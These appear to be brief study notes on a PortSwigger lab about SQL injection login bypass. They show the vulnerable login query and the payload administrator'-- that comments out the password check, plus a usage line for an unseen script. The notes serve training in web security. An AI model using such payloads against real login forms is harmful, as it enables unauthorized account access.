# Lab: SQL injection vulnerability allowing login bypass

Link: https://portswigger.net/web-security/sql-injection/lab-login-bypass


SQL injection - Login functionality

End Goal: perform SQLi attack and log in as the administrator user. 

## Analysis

```
SELECT firstname FROM users where username='admin' and password='admin'

SELECT firstname FROM users where username=''' and password='admin'

SELECT firstname FROM users where username='administrator'--' and password='admin'

SELECT firstname FROM users where username='admin'

script.py <url> <sql-payload> 
```